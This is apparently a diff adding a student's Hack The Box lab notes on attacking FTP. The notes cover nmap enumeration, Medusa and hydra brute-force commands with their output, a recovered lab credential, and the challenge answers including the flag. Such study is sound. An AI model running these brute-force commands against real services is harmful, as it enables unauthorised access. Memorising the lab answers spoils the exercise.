@@ -1,1 +1,60 @@
+Seeign as we jsut did most of these in the footprinting section i jsut wanted to get right back after them while everything is pretty fresh on my mind so if there arent as many notes in these sections thats why. 
+
+Enumerating the service - 
+
+Syntax: MJBUCKNER@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
+Nmap scan report for 192.168.2.142
+Host is up (0.00054s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
+| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
+| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
+| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
+| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
+| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
+|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
+
+
+
+Misconfigs usually have to deal with anonymous log ons.
+
+Brute Forcing
+If there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords. 
+There are many different tools to perform a brute-forcing attack. Let us explore one of them, Medusa. 
+With Medusa, we can use the option -u to specify a single user to target, or you can use the option -U to provide a file with a list of usernames.
+The option -P is for a file containing a list of passwords. We can use the option -M and the protocol we are targeting (FTP) and the option -h for the target hostname or IP address.
+
+Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.
+
+Syntax: MJBUCKNER@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
+                                                             
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
+ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
+ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
+ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
+ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
+
+okay lets just hop into the challege - 
+
+Question 1 - What port is the FTP service running on? - 2121
+1) sudo nmap -sCV -A 10.129.20.117
+2) sudo nmap -sCV -A -p- 10.129.20.117
+3) after resetting box THREE times... it finally came up as port 2121
+
+Question 2 - What username is available for the FTP server? - robin 
+1) connect to FTP port via anonymous -> ftp 10.129.15.107 -p 2121 
+2) grab the user.list and password.list from ftp
+3) hydra -L users.list -P passwords.list ftp://10.129.15.107:2121 -> remember if we are using a list and not an actual user or pass to set the flags to -L and -P not -l and -p 
+4) [2121][ftp] host: 10.129.15.107   login: robin   password: 7iz4rnckjsduza7 -> username is robin 
+ 
+Question 3 - Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer. - HTB{ATT4CK1NG_F7P_53RV1C3} 
+1) ssh robin@10.129.15.107
+2) ls 
+3) cat flag.txt - HTB{ATT4CK1NG_F7P_53RV1C3} 
+
 
